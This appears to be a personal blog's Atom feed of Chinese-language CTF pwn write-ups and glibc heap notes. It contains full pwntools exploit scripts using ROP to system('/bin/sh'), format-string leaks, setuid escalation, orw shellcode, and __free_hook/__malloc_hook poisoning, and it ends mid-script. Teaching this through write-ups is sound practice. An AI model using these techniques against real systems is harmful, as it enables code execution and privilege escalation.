@@ -1,0 +1,956 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://l1u66.github.io/</id>
+    <title>L1u66&apos;s blog</title>
+    <updated>2024-03-27T13:35:06.475Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://l1u66.github.io/"/>
+    <link rel="self" href="https://l1u66.github.io/atom.xml"/>
+    <subtitle>世间万般兵刃，唯有过往伤人最深</subtitle>
+    <logo>https://l1u66.github.io/images/avatar.png</logo>
+    <icon>https://l1u66.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2024, L1u66&apos;s blog</rights>
+    <entry>
+        <title type="html"><![CDATA[NKCTF]]></title>
+        <id>https://l1u66.github.io/post/nkctf/</id>
+        <link href="https://l1u66.github.io/post/nkctf/">
+        </link>
+        <updated>2024-03-26T10:51:59.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="leek">leek</h1>
+<p><img src="https://l1u66.github.io//post-images/1711364307553.png" alt="" loading="lazy"><br>
+发现先读取了6个字符，然后使用stdout的实际地址对每个字符取余，信安数基刚学了孙子定理(中国剩余定理)，网上直接有现成的python脚本，然后猜libc版本（恶心至极），利用栈溢出拿到shell</p>
+<pre><code>from pwn import*
+from LibcSearcher import *
+import math
+#p = process(&quot;./leak&quot;)
+p = remote(&quot;node.nkctf.yuzhian.com.cn&quot;,31660)
+elf = ELF(&quot;./leak&quot;)
+libc = elf.libc
+context(log_level='debug',arch='amd64',os='linux')
+
+def Get_Mi(m_list, m):
+    M_list = []
+    for mi in m_list:
+        M_list.append(m // mi)
+    return M_list
+
+
+def Get_resMi(M_list, m_list):
+    resM_list = []
+    for i in range(len(M_list)):
+        resM_list.append(Get_ni(M_list[i], m_list[i])[0])
+    return resM_list
+
+
+def Get_ni(a, b):
+    if b == 0:
+        x = 1
+        y = 0
+        q = a
+        return x, y, q
+    ret = Get_ni(b, a % b)
+    x = ret[0]
+    y = ret[1]
+    q = ret[2]
+    temp = x
+    x = y
+    y = temp - a // b * y
+    return x, y, q
+
+
+def result(a_list, m_list):
+    for i in range(len(m_list)):
+        for j in range(i + 1, len(m_list)):
+            if 1 != math.gcd(m_list[i], m_list[j]):
+                print(&quot;不能直接利用中国剩余定理&quot;)
+                return
+    m = 1
+    for mi in m_list:
+        m *= mi
+    Mi_list = Get_Mi(m_list, m)
+    Mi_inverse = Get_resMi(Mi_list, m_list)
+    x = 0
+    for i in range(len(a_list)):
+        x += Mi_list[i] * Mi_inverse[i] * a_list[i]
+        x %= m
+    return x
+
+
+if __name__ == '__main__':
+	#gdb.attach(p)
+	payload = b'\x65' + b'\x67' + b'\x6b' + b'\x6d' + b'\x71' + b'\x7f'
+	p.sendafter(&quot;secret\n&quot;,payload)
+	a_list = [1,2,3,4,5,6]
+	for i in range(0,6):
+		a_list[i] = ord(p.recv(1))
+		
+	t = ord(p.recv(1))
+	m_list = [0x65,0x67,0x6b,0x6d,0x71,0x7f]
+	print(a_list)
+	print(t)
+	print(&quot;最终结果为：&quot;)
+	out = result(a_list, m_list)
+	while out%0x1000!=0x780:
+		out += 0x195682D1EC3
+	print(hex(out))
+	base = out - libc.sym['_IO_2_1_stdout_']
+	print(hex(base))
+	sys = base + 0x50D70
+	sh = base + 0x1D8678
+	t += 11*8
+	rdi = base + 0x2a3e5
+	ret = base + 0x29139
+	payload = p64(ret) + p64(rdi) + p64(sh) + p64(sys) + p8(t)
+	#pause()
+	p.send(payload)
+
+p.interactive()
+</code></pre>
+<h1 id="maimai">maimai</h1>
+<p>前面有个判断逻辑，随便填了填就能过去，利用格式化字符串泄露cannary和libc地址，利用栈溢出拿到shell，但是拿到shell后发现open被ban掉了，没有打开flag的权限，所以在调用system函数前调用setuid(0)函数提权（关于这一点在begingame中的unhappy那道题中有提及，但是当时复现时看了眼wp得知要用orw，所以直接用orw来做了，没管提权的事，以后再也不看wp做题了🤡）</p>
+<pre><code>from pwn import *
+from LibcSearcher import *
+#context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
+#p = process('./pwn')
+p = remote(&quot;node.nkctf.yuzhian.com.cn&quot;,32996)
+
+#gdb.attach(p)
+p.sendlineafter(b&quot;option:\n&quot;,b'1')
+sleep(1)
+for i in range(49):
+	p.sendline(b&quot;15.0 SSS+&quot;)
+	
+p.sendlineafter(&quot;rank.\n&quot;,b&quot;15.0 SS&quot;)
+p.sendlineafter(b&quot;option:\n&quot;,b'2')
+#pause()
+p.sendlineafter(b&quot;nickname.\n&quot;,b'%11$p')
+p.recvuntil(&quot;0x&quot;)
+can = int(p.recv(16),16)
+print(&quot;can  =&quot;,hex(can))
+
+p.sendlineafter(b&quot;maimai?\n&quot;,b'aaaaaaaa')
+p.sendlineafter(b&quot;option:\n&quot;,b'2')
+p.sendlineafter(b&quot;nickname.\n&quot;,b'%13$p')
+p.recvuntil(&quot;0x&quot;)
+libc = int(p.recv(12),16) + 0x30 - 0x29dc0
+print(&quot;libc  =&quot;,hex(libc))
+
+rdi = libc + 0x2a3e5
+rdx = libc + 0x11f2e7
+rsi = libc + 0x2be51
+ret = libc + 0x29139
+sh = libc + 0x1D8678
+sys = libc + 0x50D70
+uid = libc + 0xEC0D0
+
+payload = b'a'*40 + p64(can) + p64(0xdeadbeef) + p64(rdi) + p64(0) + p64(uid) + p64(rdi) + p64(sh)  + p64(sys) 
+#pause()
+p.sendlineafter(b&quot;maimai?\n&quot;,payload)
+
+p.interactive()
+</code></pre>
+<h1 id="pallu">pallu</h1>
+<p>比赛的时候就没看到gift这里末尾没置0🤡，就看到设置标签时可能有个溢出，学习wp后发现是通过gift泄露libc基地址和栈地址，通过起名也能泄露堆地址，主要攻击思路就是把在栈上申请堆块，控制执行流</p>
+<pre><code>from pwn import *
+from LibcSearcher import *
+context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
+p = process('./pallu')
+
+def get(idx):
+	p.sendlineafter(&quot;choice:&quot;, b&quot;1&quot;)
+	p.sendlineafter(&quot;index:&quot;, str(idx))
+
+def gift(content):
+	p.sendlineafter(&quot;choice:&quot;, b&quot;8&quot;)
+	p.sendlineafter(&quot;code:&quot;, content)
+    	
+def kill(idx):
+	p.sendlineafter(&quot;choice:&quot;, b&quot;5&quot;)
+	p.sendlineafter(&quot;x:&quot;, str(idx))
+
+def sset(idx, content):
+	p.sendlineafter(&quot;choice:&quot;, b&quot;2&quot;)
+	p.sendlineafter(&quot;x:&quot;, str(idx))
+	p.sendlineafter(&quot;Labels:&quot;, content)
+	
+def breed(idx1,idx2,content):
+	p.sendlineafter(&quot;choice:&quot;, b&quot;4&quot;)
+	p.sendlineafter(&quot;x:&quot;, str(idx1))
+	p.sendlineafter(&quot;x:&quot;, str(idx2))
+	p.sendlineafter(&quot;(y/n)&quot;, b'y')
+	p.sendafter(&quot;name:&quot;, content)
+def exit_():
+	p.sendlineafter(&quot;choice:&quot;, b&quot;10&quot;)
+
+
+#gdb.attach(p)
+gift(b'a'*15)
+libc = u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00')) - 0x3c38e0
+print(&quot;libc = &quot;,hex(libc))
+gift(b'a'*71)
+stack = u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00')) - 0x20
+print(&quot;stack = &quot;,hex(stack))
+
+get(1)#0x500
+get(2)#0x930
+breed(0,1,b'h'*0x10)
+p.recvuntil(b'h'*0x10)
+p.recvuntil(b'h'*0x10)
+heap = u64(p.recv(6).ljust(8,b'\x00')) - 0x950
+print(&quot;heap = &quot;,hex(heap))
+kill(2)
+kill(1)
+kill(0)
+get(3) 
+get(3) 
+kill(0) 
+get(1) 
+get(1) 
+kill(2) 
+sset(0,b'g'*0x500+p64(0)+p64(0x221)+p64(0x7f8796c7ad78-0x7f87968b7000+libc)+p64(stack-0x30))
+giftcode=b'Happy NKCTF2024!'
+giftcode=giftcode.ljust(0x10,b'\0')
+giftcode+=p64(0)+p64(0)+p64(stack-0x30)+p64(0)
+giftcode+=p64(0)+p64(0)+p64(heap)+p64(stack-0x50)
+
+gift(giftcode)
+#pause()
+print(&quot;send giftcode2&quot;)
+gift(b'Welcome PalluWorld!')
+
+one=libc+0x4525a
+
+sset(3,b'\x00'*4*8+p64(0xdeadbe00)+p64(one)+p64(0)*10)
+
+exit_()
+
+p.interactive()
+
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[VCTF纳新赛]]></title>
+        <id>https://l1u66.github.io/post/vctf-na-xin-sai/</id>
+        <link href="https://l1u66.github.io/post/vctf-na-xin-sai/">
+        </link>
+        <updated>2024-03-19T13:26:27.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="ezhp_code">ezhp_code</h1>
+<h2 id="add函数">add函数</h2>
+<p><img src="https://l1u66.github.io//post-images/1710941694813.png" alt="" loading="lazy"><br>
+程序有后门函数，并且add功能中存在漏洞<br>
+<img src="https://l1u66.github.io//post-images/1710941285882.png" alt="" loading="lazy"><br>
+如果a1+40的位置有值，则直接执行，但是程序在del功能中将该位置置0，但是未对内容的堆清零，所以设法把内容chunk分配给漏洞chunk，但是按tchace的先进后出特性无法实现，发现限制8个chunk，所以把tchace堆填满即可实现<br>
+<img src="https://l1u66.github.io//post-images/1710941419440.png" alt="" loading="lazy"></p>
+<pre><code>from pwn import *
+from LibcSearcher import *
+context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
+p = process('./pwn')
+sys = 0x4012A5
+
+def add(size):
+	p.sendlineafter(&quot;exit\n&quot;, &quot;1&quot;)
+	p.sendlineafter(&quot;name:\n&quot;, b'a'*40 + p64(sys))
+	p.sendlineafter(&quot;say:\n&quot;, str(size))
+	p.sendlineafter(&quot;say:\n&quot;, b'a'*40 + p64(sys))
+    	
+def dele():
+	p.sendlineafter(&quot;exit\n&quot;, &quot;2&quot;)
+	
+#gdb.attach(p)
+add(71)
+add(71)
+add(71)
+add(71)
+dele()
+dele()
+dele()
+dele()
+#pause()
+p.sendlineafter(&quot;exit\n&quot;, &quot;1&quot;)
+
+#pause()
+p.interactive()
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[wolvctf]]></title>
+        <id>https://l1u66.github.io/post/wolvctf/</id>
+        <link href="https://l1u66.github.io/post/wolvctf/">
+        </link>
+        <updated>2024-03-17T12:06:34.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="byteoverflow">byteoverflow</h1>
+<p><img src="https://l1u66.github.io//post-images/1710677282987.png" alt="" loading="lazy"><br>
+发现无法修改got表项，开启了栈可执行，所以可以在栈上布置shellcode，再设法执行，发现程序存在多次一字节溢出，并且还有一次格式化字符串，可以通过格式化字符串泄露栈地址，再通过一字节溢出控制rsp从而控制执行流</p>
+<pre><code>from pwn import*
+p=process(&quot;./byteoverflow&quot;)
+context(log_level='debug',arch='amd64',os='linux')
+
+#gdb.attach(p)
+p.sendlineafter(&quot;EXIT\n\n&quot;,b'2')
+payload = b'%38$p'
+p.sendlineafter(&quot;below: \n\n&quot;,payload)
+p.recvuntil(b'0x')
+stack = int(p.recv(12),16)
+print(hex(stack))
+sc = asm(shellcraft.sh())
+p.sendlineafter(&quot;EXIT\n\n&quot;,b'1')
+ret = stack - 0x80
+pay = p64(ret + 0x10)*22 + sc 
+payload = pay.ljust(0x100,b'a') + p8(ret&amp;0xff)
+#pause()
+p.sendlineafter(&quot;Mode\n\n&quot;,payload)
+#pause()
+
+p.interactive()
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://l1u66.github.io//post-images/1710677509264.png" alt="" loading="lazy"></figure>
+<h1 id="deepstring">DeepString</h1>
+<p><img src="https://l1u66.github.io//post-images/1710685980984.png" alt="" loading="lazy"><br>
+<img src="https://l1u66.github.io//post-images/1710686002366.png" alt="" loading="lazy"><br>
+发现程序把功能函数写在了栈上，根据偏移调用函数，并且发现输入负数偏移可以造成数组溢出实现控制执行流，程序中存在reflect函数，存在格式化字符串漏洞，可以泄露libc基地址<br>
+<img src="https://l1u66.github.io//post-images/1710686177171.png" alt="" loading="lazy"><br>
+<img src="https://l1u66.github.io//post-images/1710686044642.png" alt="" loading="lazy"></p>
+<pre><code>from pwn import*
+p = process(&quot;./DeepString&quot;)
+elf = ELF(&quot;./DeepString&quot;)
+libc = elf.libc
+context(log_level='debug',arch='amd64',os='linux')
+
+#gdb.attach(p)
+reflect = 0x401405
+p.sendlineafter(b&quot;reverse\n\n&quot;,b'-37')
+pay = b'%29$paaa' + p64(reflect)
+p.sendlineafter(b&quot;STRING: \n&quot;,pay)
+p.recvuntil(&quot;0x&quot;)
+base = int(p.recv(12),16) - 16 - 0xf80d0
+print(hex(base))
+sys = base + 0x4C330
+p.sendlineafter(b&quot;reverse\n\n&quot;,b'-37')
+pay = b'/bin/sh\x00' + p64(sys)
+#pause()
+p.sendlineafter(b&quot;STRING: \n&quot;,pay)
+#pause()
+
+p.interactive()
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[newstar 2023 week4]]></title>
+        <id>https://l1u66.github.io/post/newstar-2023-week4/</id>
+        <link href="https://l1u66.github.io/post/newstar-2023-week4/">
+        </link>
+        <updated>2024-03-12T12:26:45.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="ezpwnuaf">ezpwn（UAF）</h1>
+<p>2.31</p>
+<h2 id="add">add</h2>
+<p><img src="https://l1u66.github.io//post-images/1710246482638.png" alt="" loading="lazy"><br>
+申请时先申请一个固定大小0x20的堆来存放每一页的地址，然后每一页存放着size和内容</p>
+<h2 id="delete">delete</h2>
+<p><img src="https://l1u66.github.io//post-images/1710246509890.png" alt="" loading="lazy"><br>
+释放那个0x20的堆</p>
+<h2 id="show">show</h2>
+<figure data-type="image" tabindex="1"><img src="https://l1u66.github.io//post-images/1710246536742.png" alt="" loading="lazy"></figure>
+<h2 id="edit">edit</h2>
+<p><img src="https://l1u66.github.io//post-images/1710246557783.png" alt="" loading="lazy"><br>
+这里对编辑的大小有一个检查</p>
+<p>程序存在UAF漏洞，所以可以通过free两个堆，再申请一个，从而申请到第一个堆的控制页，可以实现任意地址写，发现one_gadgets的条件无法满足，无法直接控制寄存器，但是如果条件在栈上则可以通过同时修改realloc_hook和malloc_hook实现调栈，所以选择改free_hook，由于开了PIE所以需要通过申请mmap申请的堆来泄露libc基地址</p>
+<p>exp</p>
+<pre><code>from pwn import *
+ 
+libc = ELF('./libc-2.31.so')
+ 
+p = process('./pwn')
+context(arch='amd64', log_level='debug')
+ 
+def add(idx, size, msg=b'/bin//sh'):
+    p.sendlineafter(b&quot;&gt;&gt;&quot;, b'1')
+    p.sendlineafter(b&quot;enter idx(0~15): \n&quot;, str(idx).encode())
+    p.sendlineafter(b&quot;enter size: \n&quot;, str(size).encode())
+    p.sendlineafter(b&quot;write the note: \n&quot;, msg)
+ 
+def free(idx):
+    p.sendlineafter(b&quot;&gt;&gt;&quot;, b'2')
+    p.sendlineafter(b&quot;enter idx(0~15): \n&quot;, str(idx).encode())
+ 
+def show(idx):
+    p.sendlineafter(b&quot;&gt;&gt;&quot;, b'3')
+    p.sendlineafter(b&quot;enter idx(0~15): \n&quot;, str(idx).encode())
+ 
+def edit(idx, msg):
+    p.sendlineafter(b&quot;&gt;&gt;&quot;, b'4')
+    p.sendlineafter(b&quot;enter idx(0~15): \n&quot;, str(idx).encode())
+    p.sendlineafter(b&quot;enter content: \n&quot;, msg)
+#gdb.attach(p)
+add(0, 0x21000)
+add(1, 0x40)
+add(2, 0x40)
+add(3, 0x40)
+
+free(0)
+free(1)
+
+add(4, 0x20 , b'a'*24)
+
+show(4)
+libc_base = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) + 0x21ff0
+print(f&quot;{ libc_base = :x}&quot;)
+free_hook = libc_base + libc.sym['__free_hook']
+print(f&quot;{ free_hook = :x}&quot;)
+edit(4,p64(0x21000) + p64(0)*2 + p64(free_hook))
+sys = libc_base + libc.sym['system']
+
+edit(0,p64(sys))
+edit(4, b'/bin//sh')
+#pause()
+free(0)
+
+p.interactive()
+</code></pre>
+<h1 id="god_of_changeoff-by-one">god_of_change（off-by-one）</h1>
+<p>2.31<br>
+<img src="https://l1u66.github.io//post-images/1710333803521.png" alt="" loading="lazy"><br>
+发现程序存在一个字节溢出，打堆覆盖</p>
+<pre><code>from pwn import *
+ 
+libc = ELF('./libc-2.31.so')
+ 
+p = process('./pwn')
+context(arch='amd64', log_level='debug')
+ 
+def add(size, msg=b'/bin//sh'):
+    p.sendlineafter(b&quot;Your Choice: &quot;, b'1')
+    p.sendlineafter(b&quot;size: &quot;, str(size).encode())
+    p.sendafter(b&quot;the content: \n&quot;, msg)
+ 
+def free(idx):
+    p.sendlineafter(b&quot;Your Choice: &quot;, b'3')
+    p.sendlineafter(b&quot;idx: &quot;, str(idx).encode())
+ 
+def show(idx):
+    p.sendlineafter(b&quot;Your Choice: &quot;, b'2')
+    p.sendlineafter(b&quot;idx: \n&quot;, str(idx).encode())
+    p.recvline()
+
+#gdb.attach(p)
+
+add(0x18)
+add(0x18)
+add(0x38)
+for _ in range(9):
+	add(0x78)
+
+free(0)
+add(0x18,b'\x00'*0x18 + b'\x61')
+free(1)
+add(0x58,p64(0)*3 + p64(0x441))
+free(2)
+add(0x38)
+show(3)
+libc_base = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 96 - libc.sym['__malloc_hook'] - 0x10
+print(f&quot;{ libc_base = :x}&quot;)
+sys = libc_base + libc.sym['system']
+free_hook = libc_base + libc.sym['__free_hook']
+print(f&quot;{ free_hook = :x}&quot;)
+
+add(0x38)
+free(3)
+free(2)
+free(1)
+add(0x58, flat(b'/bin/sh\x00',0,0,0x41, p64(free_hook)))
+add(0x38)
+add(0x38, p64(sys))
+free(1)
+
+p.interactive()
+ 
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[glibc堆利用]]></title>
+        <id>https://l1u66.github.io/post/glibc-dui-li-yong/</id>
+        <link href="https://l1u66.github.io/post/glibc-dui-li-yong/">
+        </link>
+        <updated>2024-03-04T12:05:01.000Z</updated>
+        <content type="html"><![CDATA[<p>学习链接：<a href="https://blog.csdn.net/qq_41453285/article/details/96865321">https://blog.csdn.net/qq_41453285/article/details/96865321</a></p>
+<h1 id="arena">arena</h1>
+<p>每个分配区（arena）都是结构体 malloc_state 的一个实例，ptmalloc 使用 malloc_state 来管理分配区。在 pwndbg 中可以使用 arena ​查看结构体内存储的数据<br>
+<img src="https://l1u66.github.io//post-images/1709627315286.png" alt="" loading="lazy"></p>
+<h1 id="malloc">malloc</h1>
+<p>每次malloc申请得到的内存指针，其实指向user data的起始处。而在除了tcache的各类bin的链表中fd与bk等指针却指向着chunk header，tcache中next指针指向user data</p>
+<h2 id="mmap申请阈值0x20000128kb">mmap申请阈值（0x20000（128kb））</h2>
+<h1 id="bin">bin</h1>
+<h2 id="tcache-bins24~0x408单链表先进后出">tcache bins(24~0x408)（单链表，先进后出）</h2>
+<h2 id="fast-bin0x20~0x80单链表先进后出">fast bin(0x20~0x80)（单链表，先进后出）</h2>
+<p>1.mallopt(1,0)即mallopt(M_MXFAST,0)将 MAX_FAST_SIZE设为0，禁用fast bin<br>
+2. 当一个堆块加进fast bin时，不会对下一个堆块的PREV_INUSE进行验证（但是会对下一个堆块size的合法性进行检查），同样地，将一个堆块从fast bin中释放的时候，也不会对其下一个堆块的PREV_INUSE进行更改（也不会改下一个堆块的PREV_SIZE），只有触发<code>malloc_consolidate()</code>后才会改下一个堆块的PREV_INUSE。<br>
+3. 利用<code>find_fake_fast target_addr</code>gdb命令可以找到目标地址附近的fake fast bin，只考虑size大小即可，不需要考虑对齐</p>
+<h3 id="malloc_consolidate">malloc_consolidate()</h3>
+<p>其本身会将fast bin内的chunk取出来，与相邻的free chunk合并后放入unsorted bin，或并入top chunk（如果无法与相邻的合并，就直接将其放入unsorted bin），然后由于申请的large chunk显然在fast bin,small bin内都找不到，于是遍历unsorted bin，将其中堆块放入small bin,large bin，因此最终的效果就是fast bin内的chunk与周围的chunk合并了（或是自身直接进入了unsorted bin），最终被放入了small bin,large bin，或者被并入了top chunk，导致fast bin均为空。</p>
+<h4 id="触发条件">触发条件：</h4>
+<p>1.申请一个大于large chunk最小大小（包括当申请的chunk需要调用brk()申请新的top chunk或调用mmap()函数时）的堆块<br>
+2.若free的chunk和相邻的free chunk合并后的size大于FASTBIN_CONSOLIDATION_THRESHOLD(64k即0x10000)（包括与top chunk合并）</p>
+<h2 id="unsorted-bin双链表先进先出">unsorted bin（双链表，先进先出）</h2>
+<p><strong>泄露libc</strong>：unsorted_bin中最先进来的free chunk的fd指针和最后进来的free chunk的bk指针均指向了main_arena中的位置，在64位中，一般是&lt;main_arena+88&gt;或&lt;main_arena+96&gt;，具体受libc影响，且main_arena的位置与__malloc_hook相差0x10，而在32位的程序中，main_arena的位置与__malloc_hook相差0x18，加入到unsorted bin中的free chunk的fd和bk通常指向&lt;main_arena+48&gt;的位置。</p>
+<pre><code>libc_base = leak_addr - libc.symbols['__malloc_hook'] - 0x10 - 88
+</code></pre>
+<p><strong>注意</strong>：从该bins取出的chunk不会对size进行检查</p>
+<h2 id="small-bins0x20~0x3f0双链表先进先出">small bins(0x20~0x3F0)（双链表，先进先出）</h2>
+<h2 id="large-bins0x400~双链表先进先出">large bins(0x400~)（双链表，先进先出）</h2>
+<h1 id="进入大循环有2条路径">进入大循环有2条路径</h1>
+<p>1、请求的堆块为large chunk。<br>
+2、small bin中对应的那个bin为空(small bin分配失败！)<br>
+<img src="https://l1u66.github.io//post-images/1709372496189.jpg" alt="" loading="lazy"></p>
+<h1 id="free">free</h1>
+<figure data-type="image" tabindex="1"><img src="https://l1u66.github.io//post-images/1709372505070.jpg" alt="" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[mprotect，mmap]]></title>
+        <id>https://l1u66.github.io/post/mprotect/</id>
+        <link href="https://l1u66.github.io/post/mprotect/">
+        </link>
+        <updated>2024-03-03T11:06:55.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="mprotect">mprotect</h1>
+<h2 id="函数原型">函数原型</h2>
+<p>int mprotect(void * addr, size_t len, int prot)<br>
+其中变量addr代表对应内存块的指针，len代表内存块的大小，而prot代表内存块所拥有的权限<br>
+对于prot来说，对应权限依照以下规则改变值</p>
+<p>无法访问 即PROT_NONE：不允许访问，值为 0<br>
+可读权限 即PROT_READ：可读，值加 1<br>
+可写权限 即PROT_WRITE：可读， 值加 2<br>
+可执行权限 即PROT_EXEC：可执行，值加 4</p>
+<p>例如：我们要将某块内存区域权限设置为可读可写可执行，那么mprotect函数中prot参数便应该是1+2+4=7。</p>
+<h1 id="mmap">mmap</h1>
+<figure data-type="image" tabindex="1"><img src="https://l1u66.github.io//post-images/1710037729602.png" alt="" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[hgame2024(week2)]]></title>
+        <id>https://l1u66.github.io/post/hgame2024week2/</id>
+        <link href="https://l1u66.github.io/post/hgame2024week2/">
+        </link>
+        <updated>2024-03-03T10:57:51.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="shellcodemaster">shellcodemaster</h1>
+<p><img src="https://l1u66.github.io//post-images/1709463523175.png" alt="" loading="lazy"><br>
+<img src="https://l1u66.github.io//post-images/1709463620333.png" alt="" loading="lazy"><br>
+发现开了沙盒ban掉了execve等函数，只能打orw，然后是先mmap了一块rwx的内存，然后读取22个字节去执行，然后把权限改为了可执行（4），并且把寄存器放置了一些值，22个字节去打orw肯定是不够的，所以需要再次向该地址写入并执行，所以需要先打开可写权限，由于各个寄存器高四字节均为0，所以改低四字节即可（使用的字节也更少）</p>
+<h2 id="shl指令">shl指令</h2>
+<pre><code>shl edi,12            #edi寄存器的值向左移12bits，用0补
+</code></pre>
+<h2 id="cdq指令">cdq指令</h2>
+<p>把EDX的所有位都设成EAX最高位的值。也就是说，当EAX &lt;80000000, EDX 为00000000；当EAX &gt;= 80000000， EDX 则为FFFFFFFF</p>
+<p>恢复权限后调用read函数写入orw的shellcode即可<br>
+exp如下</p>
+<pre><code>from pwn import*
+p=process(&quot;./vuln&quot;)
+context(log_level='debug',arch='amd64',os='linux')
+gdb.attach(p)
+shellcode1='''
+shl edi,12
+mov dx, 0x7
+mov ax, 10
+syscall
+cdq
+mov esi, edi
+xor edi, edi
+xor eax, eax
+syscall
+'''
+p.send(asm(shellcode1))
+shellcode_orw = asm('''
+push 0x67616c66
+mov rdi,rsp
+xor esi,esi
+push 2
+pop rax
+syscall
+mov rdi,rax
+mov rsi,rsp
+mov edx,0x100
+xor eax,eax
+syscall
+mov edi,1
+mov rsi,rsp
+push 1
+pop rax
+syscall
+''')
+p.sendline(b'\x90'*0x16 + asm(&quot;shl rsp, 12; add rsp, 0x500;&quot;) + shellcode_orw)
+#nop滑板只要大于22字节就行，主要为了配合执行流，调节栈顶方便push和pop
+p.interactive()
+</code></pre>
+<h1 id="old_fastnote">old_fastnote</h1>
+<p><img src="https://l1u66.github.io//post-images/1709630337061.png" alt="" loading="lazy"><br>
+发现got表无法更改，程序也没有edit函数，2.23版本的libc，没有tcache bin，程序也没后门，只能从libc入手，所以首先就要通过unsorted bin泄露libc基地址，然后可以利用double free漏洞实现__malloc_hook的更改，这里需要注意从fast bin中取出chunk时会检查size，但是不要求对齐，gdb有专门的工具指令<code>find_fake_fast target_addr</code>，可以找到目标地址附近的fake chunk，将__malloc_hook改为one_gadgets即可拿到shell</p>
+<pre><code>from pwn import *
+from LibcSearcher import *
+context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
+p = process('./vuln')
+libc = ELF('./libc-2.23.so')
+def add(idx,size,content):
+	p.recvuntil(&quot;:&quot;)
+	p.sendline(b&quot;1&quot;)
+	p.recvuntil(&quot;Index: &quot;)
+	p.sendline(str(idx))
+	p.recvuntil(&quot;Size: &quot;)
+	p.sendline(str(size))
+	p.recvuntil(&quot;Content: &quot;)
+	p.sendline(content)
+
+def show(idx):
+	p.recvuntil(&quot;:&quot;)
+	p.sendline(b&quot;2&quot;)
+	p.recvuntil(&quot;Index: &quot;)
+	p.sendline(str(idx))
+	
+def dele(idx):
+	p.recvuntil(&quot;:&quot;)
+	p.sendline(b&quot;3&quot;)
+	p.recvuntil(&quot;Index: &quot;)
+	p.sendline(str(idx))
+#gdb.attach(p)
+
+add(0,0x80,b'a'*8)
+add(1,0x60,b'a'*8)
+add(2,0x60,b'a'*8)
+dele(0)
+add(0,0x80,'\x78')
+show(0)
+base = u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00')) - 0x3C0A78
+malloc_hook = base + libc.sym['__malloc_hook']
+one = 0xf1247
+gadget = base + one
+fake = malloc_hook - 0x23 
+add(0, 0x80, b'a') 
+dele(1) 
+dele(2) 
+dele(1) 
+add(3, 0x60, p64(fake)) 
+print(hex(malloc_hook))
+add(4, 0x60, b'a') 
+add(5, 0x60, b'a') 
+add(6, 0x60, b'a' * 0x13 + p64(gadget)) 
+#pause()
+p.recvuntil(&quot;:&quot;)
+p.sendline(b&quot;1&quot;)
+p.recvuntil(&quot;Index: &quot;)
+p.sendline(str(11))
+p.recvuntil(&quot;Size: &quot;)
+p.sendline(str(0x60))
+
+p.interactive()
+</code></pre>
+<p>这里改完_malloc_hook之后触发double free错误也可以拿到shell（实际上当printf函数输出较多内容时也会调用malloc和free函数来申请释放缓冲区，scanf函数也是如此）<br>
+详情见：<a href="https://blog.osiris.cyber.nyu.edu/2017/09/30/csaw-ctf-2017-auir/">https://blog.osiris.cyber.nyu.edu/2017/09/30/csaw-ctf-2017-auir/</a></p>
+<h1 id="elden-ring-ii">Elden Ring Ⅱ</h1>
+<p>2.31的libc，存在UAF漏洞，先利用unsorted bin泄露libc基地址，然后利用UAF漏洞申请并修改free_hook得到shell(由于只能申请16次，并且不能重复申请相同的页数，所以无法利用double free漏洞)</p>
+<pre><code>from pwn import *
+from LibcSearcher import *
+context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
+p = process('./vuln')
+libc = ELF('./libc.so.6')
+def add(idx,size):
+	p.recvuntil(&quot;&gt;&quot;)
+	p.sendline(b&quot;1&quot;)
+	p.recvuntil(&quot;Index: &quot;)
+	p.sendline(str(idx))
+	p.recvuntil(&quot;Size: &quot;)
+	p.sendline(str(size))
+	
+def edit(idx,content):
+	p.recvuntil(&quot;&gt;&quot;)
+	p.sendline(b&quot;3&quot;)
+	p.recvuntil(&quot;Index: &quot;)
+	p.sendline(str(idx))
+	p.recvuntil(&quot;Content: &quot;)
+	p.sendline(content)
+
+def show(idx):
+	p.recvuntil(&quot;&gt;&quot;)
+	p.sendline(b&quot;4&quot;)
+	p.recvuntil(&quot;Index: &quot;)
+	p.sendline(str(idx))
+	
+def dele(idx):
+	p.recvuntil(&quot;&gt;&quot;)
+	p.sendline(b&quot;2&quot;)
+	p.recvuntil(&quot;Index: &quot;)
+	p.sendline(str(idx))
+
+#gdb.attach(p)
+for i in range (0,8):
+	add(i,0x90)
+add(8,0x20)
+for i in range (0,8):
+	dele(i)
+show(7)
+libc_base = u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00')) - 0x7f4d259cebe0 + 0x7f4d25843c90 - 0x61C90
+__free_hook = libc_base + libc.sym[&quot;__free_hook&quot;]
+system_addr = libc_base + libc.sym[&quot;system&quot;]
+
+add(9, 0x20)
+add(10, 0x20)
+dele(8)
+dele(9)
+edit(10, b&quot;/bin/sh\x00&quot;)
+edit(9, p64(__free_hook))
